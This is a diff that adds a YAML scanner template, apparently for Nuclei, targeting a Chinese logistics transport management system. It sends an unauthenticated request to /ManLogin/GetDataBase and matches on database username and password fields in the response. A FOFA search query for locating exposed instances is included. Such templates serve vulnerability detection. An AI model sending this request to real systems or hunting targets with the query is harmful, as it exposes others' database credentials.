@@ -1,0 +1,33 @@
+id: skwlysgl-getdatabase-info-disclosure
+
+info:
+  name: 时空物流运输管理系统存在敏感信息泄露漏洞
+  author: onewin
+  severity: high
+  description: |
+    时空物流运输管理系统存在敏感信息泄露漏洞, 泄露数据库 usernames and passwords.
+  metadata:
+    fofa-query: body="/Images/ManLogin/name.png"
+  tags: 时空物流运输管理系统
+
+http:
+  - raw:
+      - |+
+        @timeout: 30s
+        GET /ManLogin/GetDataBase HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "datausername"
+          - "datauserpwd"
+      - type: status
+        status:
+          - 200
